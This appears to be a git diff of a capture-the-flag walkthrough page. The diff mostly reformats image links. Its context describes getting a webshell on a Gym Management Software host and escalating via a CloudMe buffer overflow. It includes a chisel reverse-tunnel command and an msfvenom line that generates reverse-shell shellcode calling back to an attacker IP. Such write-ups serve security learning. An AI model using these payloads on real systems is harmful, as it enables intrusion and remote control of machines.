@@ -4,25 +4,25 @@
 
 Nmap Scan:
 
-<figure><img src="../../../.gitbook/assets/image (3039).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3039).png>)
 
 ### Gym
 
 On port 8080, it was a gym-related page:
 
-<figure><img src="../../../.gitbook/assets/image (2910).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2910).png>)
 
 We can use `gobuster` on the website to find more directories:
 
-<figure><img src="../../../.gitbook/assets/image (2698).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2698).png>)
 
 Checking the `contact.php` file, we see the software used to make this.
 
-<figure><img src="../../../.gitbook/assets/image (3327).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3327).png>)
 
 Then, we can search for exploits for this Gym Management Software 1.0.
 
-<figure><img src="../../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(742).png>)
 
 We can try the RCE exploit:
 
@@ -30,13 +30,13 @@ We can try the RCE exploit:
 
 By running the exploit, we would gain a webshell:
 
-<figure><img src="../../../.gitbook/assets/image (1666).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1666).png>)
 
 Afterwards, we can download `nc.exe` onto the machine via `smbserver.py`.
 
-<figure><img src="../../../.gitbook/assets/image (1660).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1660).png>)
 
-<figure><img src="../../../.gitbook/assets/image (3838).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3838).png>)
 
 ## Privilege Escalation
 
@@ -61,7 +61,7 @@ dir
 
 When checking for exploits regarding CloudMe, we can find a few Buffer Overflow exploits that can be used for RCE using shellcode.
 
-<figure><img src="../../../.gitbook/assets/image (3181).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3181).png>)
 
 {% embed url="https://www.exploit-db.com/exploits/48389" %}
 
@@ -77,11 +77,9 @@ chisel server --port 4444 --reverse
 
 Then, we need to generate new shellcode for the exploit:
 
-{% code overflow="wrap" %}
 ```bash
 msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
 ```
-{% endcode %}
 
 The final script based on the PoC should look like this:
 
@@ -154,6 +152,6 @@ except Exception as e:
 
 Afterwards, run it using `python3` and an administrator shell will spawn.
 
-<figure><img src="../../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(774).png>)
 
 Rooted!
